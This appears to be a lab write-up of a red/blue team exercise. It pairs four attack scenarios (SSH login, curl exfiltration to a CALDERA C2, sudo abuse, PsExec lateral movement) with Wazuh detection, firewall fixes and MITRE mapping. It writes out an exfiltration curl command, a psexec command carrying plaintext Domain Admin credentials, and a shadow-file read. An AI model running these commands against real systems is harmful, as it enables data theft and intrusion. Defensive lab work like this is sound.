# Planned Attack Scenarios

This document outlines the attack scenarios executed during Phase 1 (Baseline/Weak Security) following the Attack → Detect → Fix → Verify methodology.

**Based on:**
- Red Team actual execution (see: `red-team-attack-plan-phase1.md`)
- Blue Team remediation steps (see: `blue-team-post-attack-remediation.md`)

**Attack Flow:** Initial Access (SSH) → Credential Hunting → Privilege Escalation → Lateral Movement (PsExec/SMB) → Data Exfiltration → Cleanup

## Table of Contents

- [Scenario 1: "The Weakest Link" (SSH Brute Force)](#scenario-1-the-weakest-link-ssh-brute-force)
- [Scenario 2: "Call Home" (C2 Exfiltration)](#scenario-2-call-home-c2-exfiltration)
- [Scenario 3: "Root for Free" (Privilege Escalation)](#scenario-3-root-for-free-privilege-escalation)
- [Scenario 4: "Lateral Movement" (Network Spreading)](#scenario-4-lateral-movement-network-spreading)
- [Technology Summary by Scenario](#technology-summary-by-scenario)
- [Attack & Defend Matrix (MITRE ATT&CK)](#attack--defend-matrix-mitre-attck)

---

## Scenario 1: "The Weakest Link" (SSH Brute Force)

**Focus:** Missing password on `webadmin`, Wazuh detection, Password Policy.

### Attack (Red Team)

- CALDERA agent established foothold on Linux server (10.10.0.51) as user `vbubuntu`.
- Red Team attempts SSH login as `webadmin` on the Linux server.
- Because `webadmin` has **no password set**, the login succeeds immediately.
- **Additional noise generation:** Manual brute force attempts (PAM authentication failures) to stress-test Wazuh detection rules.

### Detection (Wazuh SIEM)

- Wazuh agent on Linux sends logs to the SIEM.
- Visible in dashboard: Alert `SSHD: authentication failed` (multiple times) followed by `SSHD: authentication success`.
- **Technology:** Wazuh Log Analysis.

### Response / Remediation (Blue Team)

- Firewall is not used here (internal traffic).
- Connect to Linux and change the password to a strong passphrase (`W3bAdm1nS3cure2025!`).
- **Harden SSH configuration** in `/etc/ssh/sshd_config`:
  - `PermitRootLogin no`
  - `MaxAuthTries 3`
  - `PermitEmptyPasswords no`
  - `LoginGraceTime 60`
- Restart SSH service to apply changes.
- **Technology:** OS Hardening & Password Policy.

### Verification

- Red Team repeats the SSH login as `webadmin`. A password prompt now appears and the attack is **unsuccessful** with wrong credentials.

---

## Scenario 2: "Call Home" (C2 Exfiltration)

**Focus:** pfSense Firewall, Network Containment, Sysmon.

> This is a scenario where pfSense plays the main role as traffic goes outside the network.

### Attack (Red Team)

- CALDERA agent running on Windows Workstation creates a test file to simulate data theft.
- Attacker generates `C:\Users\Public\Exfil_Proof.txt` with content "HACKED BY RED TEAM".
- Attacker uses `curl` (native CMD tool) to exfiltrate data to C2 server:
  ```cmd
  echo "HACKED BY RED TEAM" > C:\Users\Public\Exfil_Proof.txt && curl -F "data=@C:\Users\Public\Exfil_Proof.txt" http://10.10.0.53:8888/file/upload
  ```
- **Note:** PowerShell `Invoke-WebRequest` was initially planned but caused errors during execution.

### Detection (Wazuh & Sysmon)

- Wazuh (with Sysmon) logs Event ID 1 (Process Create) and Event ID 3 (Network Connection).
- Visible in dashboard: `curl.exe` process opening a connection to C2 server (10.10.0.53:8888).
- **Technology:** Sysmon + Wazuh.

### Response / Remediation (pfSense)

- Decision to block communication between infected machine (10.10.0.50) and C2 server (10.10.0.53).
- Add pfSense rule at the top: Block TCP from 10.10.0.50 to 10.10.0.53 port 8888.
- **Technology:** pfSense Firewall Rules.

### Verification

- Malware tries again. Receives **Connection Timeout**.
- Wazuh displays "Firewall Block" event.

---

## Scenario 3: "Root for Free" (Privilege Escalation)

**Focus:** Configuration errors, FIM (File Integrity Monitoring).

### Attack (Red Team)

- Attacker is already on Linux (as `webadmin`).
- **Credential Hunting:** Discovers hardcoded credentials in `/tmp/db_config.py` containing `admin_lab` Domain Admin password.
- Types `sudo cat /etc/shadow` and obtains password hashes without entering a password (due to `NOPASSWD` in sudoers file).
- Modifies a system file (e.g., adds a new cron job).

### Detection (Wazuh FIM)

- Wazuh has a FIM module that monitors changes to critical files.
- Visible in dashboard: Alert `Integrity checksum changed for: /etc/crontab` or detection of sudo command in logs.
- **Technology:** Wazuh FIM.

### Response / Remediation (System Admin)

- Remove `NOPASSWD` from `/etc/sudoers`.
- Restore the original cron file.
- **Delete credential file:** Remove `/tmp/db_config.py` containing hardcoded passwords.
- **Rotate compromised credentials:** Change password for `admin_lab` Domain Admin account.
- **Technology:** OS Configuration & Credential Management.

### Verification

- Attacker types `sudo cat /etc/shadow`. System prompts for password. **Attack stopped.**
- Credential file `/tmp/db_config.py` no longer exists (returns "No such file").
- Old `admin_lab` password (`Administrator1209!!`) no longer works (rotated to `Adm1nL4bS3cure2025!`).

---

## Scenario 4: "Lateral Movement" (Network Spreading)

**Focus:** Windows Host Firewall, Segmentation (at host level).

### Attack (Red Team)

- **Ingress Tool Transfer:** Attacker downloads Impacket tools (`psexec.py`) to the compromised Linux server using `wget`.
- **Failed lateral movement attempt:** First attempt using `employee` credentials fails (no admin privileges).
- **Credential hunting:** Discovers `/tmp/db_config.py` containing `admin_lab` Domain Admin credentials.
- Using stolen `admin_lab` credentials, attacker executes **PsExec** from Linux (`.51`) to Windows (`.50`) via **SMB protocol (port 445)**.
- Command: `python3 psexec.py 'TECHNOVA/admin_lab:Administrator1209!!@10.10.0.50' "C:\Users\Public\splunkd.exe -server http://10.10.0.53:8888 -group red"`
- Since Windows Firewall is disabled (as defined in Phase 0), the lateral movement succeeds.
- CALDERA agent (`splunkd.exe`) is deployed on Windows as SYSTEM.

### Detection (Wazuh)

- Visible in dashboard: Wazuh alerts for SMB connections (port 445) and suspicious service creation (`splunkd.exe`).
- Sysmon logs Process Creation (Event ID 1) and Network Connection (Event ID 3) from remote IP.
- Windows Event Logs show Logon Type 3 (Network Logon) as Domain Admin.
- **Technology:** Wazuh + Sysmon + Windows Event Logs.

### Response / Remediation (Windows Firewall)

- Conclusion: `10.10.0.53` (CALDERA) and `10.10.0.51` (compromised Linux) should not communicate with the Windows client.
- Enable Windows Defender Firewall.
- Create Inbound rules:
  - Block all traffic from `10.10.0.53` (CALDERA C2)
  - Block SMB (port 445) from `10.10.0.51` (Linux server)
  - Block RPC (port 135) and WMI (ports 5985/5986) from external hosts
- **Cleanup artifacts:** Remove `splunkd.exe` (CALDERA agent) and Impacket tools (`psexec.py`) from both systems.
- **Technology:** Host-based Firewall & Artifact Removal.

### Verification

- Attacker attempts PsExec lateral movement via SMB. Connection to port 445 is **blocked by Windows Firewall**.
- CALDERA C2 communication fails. Agent cannot reconnect.
- Old `admin_lab` credentials no longer work (password rotated).

---

## Technology Summary by Scenario

| Scenario | Attack | Detection (Wazuh) | Defense / Tool |
|----------|--------|-------------------|----------------|
| 1. Brute Force | SSH Login (webadmin) | Log Analysis (Auth Fail/Success) | Strong Passwords + SSH Hardening |
| 2. C2 / Exfil | curl.exe Upload | Sysmon (Process + Network Conn) | pfSense Firewall (Block C2) |
| 3. Priv Esc | Sudo Abuse + Cred Hunting | FIM (File Change) + Sudo Logs | Config Fix + Cred Rotation |
| 4. Lat. Move | PsExec/SMB (port 445) + Agent Deploy | Sysmon (Service + SMB Conn) | Windows Firewall (Block SMB) |

---

## Attack & Defend Matrix (MITRE ATT&CK)

### Scenario 1: SSH Brute Force

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Credential Access |
| **MITRE Technique** | T1110 - Brute Force |
| **MITRE Sub-technique** | T1110.001 - Password Guessing |
| **Target** | Linux Server (10.10.0.51) |
| **Attack Vector** | SSH protocol (port 22) |
| **Vulnerability** | No password |
| **Wazuh Detection Rules** | 5710, 5715, 100001, 100002 |
| **Detection Method** | Log Analysis - Authentication failures/success |
| **Remediation** | Change password to `W3bAdm1nS3cure2025!` + SSH hardening (MaxAuthTries 3, PermitRootLogin no) |
| **Defense Layer** | OS Hardening |

---

### Scenario 2: C2 Exfiltration

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Command and Control / Exfiltration |
| **MITRE Technique** | T1071 - Application Layer Protocol |
| **MITRE Sub-technique** | T1071.001 - Web Protocols |
| **Additional Technique** | T1041 - Exfiltration Over C2 Channel |
| **Target** | Windows Workstation (10.10.0.50) |
| **Attack Vector** | curl.exe HTTP POST to C2 (10.10.0.53:8888) |
| **Vulnerability** | No outbound traffic filtering to C2 server |
| **Wazuh Detection Rules** | 100020, 100021, 100023 |
| **Detection Method** | Sysmon Event ID 1 (Process) + Event ID 3 (Network) |
| **Remediation** | pfSense block rule for infected host |
| **Defense Layer** | Network Perimeter Firewall |

---

### Scenario 3: Privilege Escalation

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Privilege Escalation / Credential Access |
| **MITRE Technique** | T1548 - Abuse Elevation Control Mechanism |
| **MITRE Sub-technique** | T1548.003 - Sudo and Sudo Caching |
| **Additional Technique** | T1552.001 - Credentials In Files, T1053.003 - Cron |
| **Target** | Linux Server (10.10.0.51) |
| **Attack Vector** | Credential hunting + sudo NOPASSWD abuse |
| **Vulnerability** | Hardcoded credentials in `/tmp/db_config.py` + `NOPASSWD` in sudoers |
| **Wazuh Detection Rules** | 100011, 100012, 100040, 100041 |
| **Detection Method** | FIM - File Integrity Monitoring on /etc/crontab + sudo command logs |
| **Remediation** | Remove NOPASSWD + Delete credential file + Rotate `admin_lab` password |
| **Defense Layer** | OS Configuration |

---

### Scenario 4: Lateral Movement

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Lateral Movement / Discovery |
| **MITRE Technique** | T1021 - Remote Services |
| **MITRE Sub-technique** | T1021.002 - SMB/Windows Admin Shares |
| **Additional Technique** | T1105 - Ingress Tool Transfer (Impacket), T1046 - Network Discovery |
| **Target** | Windows Workstation (10.10.0.50) |
| **Attack Vector** | PsExec via SMB (port 445) using stolen `admin_lab` credentials |
| **Vulnerability** | Windows Firewall disabled + Hardcoded Domain Admin credentials |
| **Wazuh Detection Rules** | 100050, 100051, Sysmon Event 1, 3 |
| **Detection Method** | SMB connections + Service creation + Network Logon (Type 3) |
| **Remediation** | Enable Windows Firewall + Block SMB/RPC + Rotate credentials + Remove artifacts |
| **Defense Layer** | Host-based Firewall |

---
